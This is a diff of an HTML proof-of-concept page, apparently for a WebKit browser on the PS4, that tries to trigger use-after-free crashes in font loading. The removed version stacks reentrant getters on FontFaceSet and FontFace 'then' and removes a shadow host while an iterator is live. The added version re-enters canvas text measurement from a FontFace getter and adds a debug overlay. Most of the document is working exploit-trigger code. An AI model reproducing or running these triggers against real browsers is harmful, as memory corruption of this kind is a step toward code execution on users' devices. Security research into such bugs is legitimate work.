@@ -1,129 +1,81 @@
-
 <!DOCTYPE html>
 <html>
 <head><meta charset="utf-8"></head>
 <body>
-<pre id="log"></pre>
+
 <script>
-// V6: Cascata de dois níveis de reentrada
-//
-// Nível 1: FontFaceSet.prototype.then (async via data URL)  ← já confirmado
-//   → força layout → flushPendingDescendantUpdates() ativo
-//     → Nível 2: FontFace.prototype.then (sync via local font) ← confirmado em 5 UAFs
-//       → host.remove() COM iterador ativo → UAF!
+(function(){const logElement=document.createElement('pre');logElement.id='debug-log';logElement.style.cssText='position: fixed; bottom: 0; left: 0; width: 100%; max-height: 220px; overflow-y: auto; background: rgba(0, 0, 0, 0.85); color: #ff5555; font-family: monospace; font-size: 11px; z-index: 999999; padding: 8px; box-sizing: border-box; margin: 0; border-top: 2px solid #ff0000; text-align: left; white-space: pre-wrap; word-break: break-all;';if(document.body){document.body.appendChild(logElement);}else{document.addEventListener('DOMContentLoaded',()=>document.body.appendChild(logElement));}function log(msg,color='#ff5555'){if(!logElement)return;const line=document.createElement('div');line.style.color=color;line.textContent=msg;logElement.appendChild(line);logElement.scrollTop=logElement.scrollHeight;}window.onerror=function(message,source,lineno,colno,error){log(`[ERRO JS] ${message}\n  -> ${source}:${lineno}:${colno}`);};window.addEventListener('error',function(event){const target=event.target;if(target&&(target.tagName||target===window)){const tagName=target.tagName?target.tagName.toLowerCase():'recurso';const sourceUrl=target.src||target.href||'desconhecido';log(`[FALHA RECURSO/${tagName}] Não foi possível carregar: ${sourceUrl}`,'#ffaa00');}},true);window.addEventListener('unhandledrejection',function(event){log(`[PROMISE REJECTION] ${event.reason}`);});['log','error','warn','info'].forEach(method=>{const original=console[method];console[method]=function(...args){original.apply(console,args);const text=args.map(arg=>{if(typeof arg==='object'){try{return JSON.stringify(arg);}catch(e){return '[Objeto Circular]';}}return arg;}).join(' ');let color='#ffffff';if(method==='error')color='#ff5555';if(method==='warn')color='#ffaa00';log(`[Console.${method}] ${text}`,color);};});log('[Debug Ativo]','#00ff00');})();
+</script>
 
-function log(s) {
-    document.getElementById('log').textContent += s + '\n';
-}
+<script>
+let ctx = null;
+let inGetter = false;
 
-document.fonts;
-
-// === HOST PRINCIPAL: data URL longa → trigger async FontFaceSet.prototype.then ===
-var host = document.createElement('div');
-document.body.appendChild(host);
-var shadow = host.attachShadow({ mode: 'open' });
-
-var dataUrl = 'data:font/woff;base64,' + 'A'.repeat(150000);
-var style1 = document.createElement('style');
-style1.textContent =
-    '@font-face { font-family: asyncFont; src: url("' + dataUrl + '"); }' +
-    '.p1 { font: 24px asyncFont; }';
-shadow.appendChild(style1);
-var span1 = document.createElement('span');
-span1.className = 'p1'; span1.textContent = 'async';
-shadow.appendChild(span1);
-
-document.body.offsetHeight;
-document.fonts.load('24px asyncFont', 'A');
-document.fonts.ready;
-
-// Cria pendencia UpdateType::ActiveSet no shadow de host
-var prepStyle = document.createElement('style');
-prepStyle.textContent = '.unused1 { color: red; }';
-shadow.prepend(prepStyle);
-log('setup host (async). status=' + document.fonts.status);
-
-// === HOST2: local font → trigger sync FontFace.prototype.then durante o flush ===
-// Será criado DENTRO do getter de nível 1 para garantir que está "fresco"
-
-var innerGetterCount = 0;
-
-// === GETTER NÍVEL 1: FontFaceSet.prototype.then (async) ===
-Object.defineProperty(FontFaceSet.prototype, 'then', {
-    configurable: true,
-    get: function() {
-        delete FontFaceSet.prototype.then;
-        log('=== GETTER N1 (FontFaceSet async) disparou! ===');
-        log('N1 status: ' + document.fonts.status);
-
-        // Cria host2 com local font + pendencia para o flush
-        var host2 = document.createElement('div');
-        document.body.appendChild(host2);
-        var shadow2 = host2.attachShadow({ mode: 'open' });
-
-        var style2 = document.createElement('style');
-        // local(Helvetica): fonte do sistema, resolve rapidamente/sincronamente
-        style2.textContent =
-            '@font-face { font-family: syncFont; src: local(Helvetica); }' +
-            '.p2 { font: 24px syncFont; }';
-        shadow2.appendChild(style2);
-        var span2 = document.createElement('span');
-        span2.className = 'p2'; span2.textContent = 'sync';
-        shadow2.appendChild(span2);
-
-        document.body.offsetHeight; // forca carregamento de syncFont
-        document.fonts.load('24px syncFont', 'A');
-
-        // Materializa face.loaded da syncFont
-        document.fonts.forEach(function(f) {
-            var fam = f.family.trim().replace(/['"]/g, '');
-            if (fam === 'syncFont') {
-                void f.loaded;
-                log('N1 syncFont encontrada, status: ' + f.status);
-            }
-        });
-
-        // Cria pendencia UpdateType::ActiveSet em shadow2
-        var prepStyle2 = document.createElement('style');
-        prepStyle2.textContent = '.unused2 { color: blue; }';
-        shadow2.prepend(prepStyle2);
-
-        // === GETTER NÍVEL 2: FontFace.prototype.then (confirmado em 5 UAFs) ===
+// Verifica se o navegador suporta FontFace antes de mexer no prototype
+if (typeof FontFace !== 'undefined' && window.FontFace && FontFace.prototype) {
+    try {
         Object.defineProperty(FontFace.prototype, 'then', {
             configurable: true,
-            get: function() {
-                delete FontFace.prototype.then;
-                ++innerGetterCount;
-                log('>>> GETTER N2 (FontFace sync) disparou! family='
-                    + (this.family || '?') + ' status=' + (this.status || '?'));
-                // UAF: host.remove() com flushPendingDescendantUpdates() na call stack
-                // O flush está iterando m_inDocumentShadowRoots,
-                // e host está nessa lista → liberar o nó → crash esperado
-                log('N2 chamando host.remove()...');
-                host.remove();
-                log('N2 apos host.remove() — sem crash ate aqui');
+            get() {
+                if (inGetter || !ctx)
+                    return undefined;
+                inGetter = true;
+                for (let i = 0; i < 16; i++) {
+                    try { ctx.measureText('q' + String.fromCharCode(65 + i) + 'z'); } catch (e) { }
+                    try { ctx.measureText('x'); } catch (e) { }
+                }
+                inGetter = false;
                 return undefined;
             }
         });
-
-        log('N1 getters instalados, forçando layout...');
-        // Este layout dispara flushPendingDescendantUpdates()
-        // que itera host E host2 em m_inDocumentShadowRoots
-        // Ao processar host2 (syncFont local), FontFace.prototype.then pode disparar
-        // enquanto o iterador ainda está na lista → host.remove() = UAF
-        document.body.offsetHeight;
-
-        log('N1 apos layout: innerGetter=' + innerGetterCount);
-        return undefined;
+    } catch(e) {
+        console.warn("Não foi possível redefinir FontFace.prototype.then", e);
     }
-});
+}
 
-log('N1 getter instalado. aguardando async...');
+function attempt(n)
+{
+    // Se o navegador não suporta FontFace, avisa e interrompe a tentativa para não gerar erro fatal
+    if (typeof FontFace === 'undefined' || !document.fonts) {
+        throw new Error("API FontFace não suportada neste navegador (WebKit antigo/PS4).");
+    }
 
-Promise.resolve().then(function() {
-    log('microtask: getter N1=' +
-        (typeof FontFaceSet.prototype.then === 'undefined' ? 'ja disparou' : 'pendente'));
-});
+    for (let d = 0; d < 3; d++)
+        new FontFace('Dummy' + n + '_' + d, 'local(Helvetica)');
+
+    const family = 'VarFam' + n;
+    const face = new FontFace(family, 'local(Helvetica)');
+    void face.loaded;
+    document.fonts.add(face);
+
+    const canvas = document.createElement('canvas');
+    canvas.width = 10;
+    canvas.height = 10;
+    ctx = canvas.getContext('2d');
+    
+    ctx.font = '20px Helvetica, ' + family;
+
+    for (let i = 0; i < 50; i++)
+        ctx.measureText('x');
+
+    ctx.measureText('\uE005AB');
+}
+
+window.onload = function () {
+    setTimeout(function () {
+        // Verifica suporte global antes de iniciar o loop
+        if (typeof FontFace === 'undefined' || !document.fonts) {
+            console.error("ERRO: O navegador do PS4 não possui suporte à API FontFace necessária para este teste.");
+            document.body.appendChild(document.createTextNode("ERRO: FontFace não suportado neste dispositivo."));
+            return;
+        }
+
+        for (let n = 0; n < 3; n++) {
+            try { attempt(n); } catch (e) { console.error(e); }
+        }
+        document.body.appendChild(document.createTextNode("PASS if no crash"));        
+    }, 0);
+};
 </script>
 </body>
 </html>
